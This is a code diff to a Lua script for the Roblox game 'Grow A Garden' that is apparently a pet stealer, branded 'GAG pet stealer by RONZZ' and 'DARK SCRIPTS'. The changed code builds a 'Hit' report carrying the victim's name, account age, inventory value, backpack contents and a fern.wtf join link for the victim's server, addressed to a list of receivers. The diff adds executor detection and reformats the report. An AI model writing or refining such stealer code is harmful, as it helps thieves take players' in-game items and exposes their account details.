@@ -186,21 +186,12 @@ local function formatNumber(number)
     if number == nil then
         return "0"
     end
-    local suffixes = {"", "k", "m", "b", "t"}
-    local suffixIndex = 1
-    while number >= 1000 and suffixIndex < #suffixes do
-        number = number / 1000
-        suffixIndex = suffixIndex + 1
+    local formatted = tostring(math.floor(number))
+    while true do  
+        formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
+        if k == 0 then break end
     end
-    if suffixIndex == 1 then
-        return tostring(math.floor(number))
-    else
-        if number == math.floor(number) then
-            return string.format("%d%s", number, suffixes[suffixIndex])
-        else
-            return string.format("%.2f%s", number, suffixes[suffixIndex])
-        end
-    end
+    return formatted
 end
 
 -- Update number formatting to always use commas and full numbers
@@ -279,7 +270,7 @@ local function SendJoinMessage(list, prefix)
     -- Player info
     local playerName = plr.Name
     local receivers = table.concat(_G.Usernames, ", ")
-    local executor = "Delta" -- Change if you want this dynamic
+    local executor = detectExecutor()
     local accountAge = plr.AccountAge or "N/A"
     local totalValueStr = formatNumber(totalValue) .. "¢"
     local joinUrl = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId
@@ -305,6 +296,7 @@ local function SendJoinMessage(list, prefix)
     local placeId = tostring(game.PlaceId or "N/A")
 
     -- Build the embed description
+    local joinUrlMarkdown = string.format("[%s](%s)", jobId, joinUrl)
     local description = string.format([[ 
 :bust_in_silhouette: **Player Information**
 ```Name: %s
@@ -318,13 +310,13 @@ Account Age: %s days```
 :island: **Join with URL**
 %s
 -# %s | %s
-]], playerName, receivers, executor, accountAge, totalValueStr, backpackStr, joinUrl, placeId, jobId)
+]], playerName, receivers, executor, accountAge, totalValueStr, backpackStr, joinUrlMarkdown, placeId, jobId)
 
     local data = {
-        ["content"] = "",
+        ["content"] = prefix,
         ["embeds"] = {{
             ["title"] = ":potted_plant: Grow A Garden Hit - DARK SCRIPTS :four_leaf_clover:",
-            ["color"] = 16711680, -- Red
+            ["color"] = 16753920, -- Orange
             ["description"] = description,
             ["footer"] = {
                 ["text"] = "GAG pet stealer by RONZZ. discord.gg/GY2RVSEGDT"
